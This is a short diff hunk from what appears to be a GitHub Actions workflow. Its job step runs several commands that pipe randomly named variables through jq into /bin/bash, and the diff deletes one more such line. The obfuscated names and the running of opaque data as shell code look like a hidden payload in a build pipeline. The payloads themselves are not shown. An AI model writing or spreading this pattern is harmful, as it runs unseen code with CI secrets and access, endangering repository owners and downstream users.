@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$wk207" | jq -r .fb469 | /bin/bash
           echo $tc99855 | jq -r .ufva34 | /bin/bash
           echo $jsjuy55213 | jq -r .u455 | /bin/bash
-          printf '%s' "$omvvk01828" | jq -r .mhpu846 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
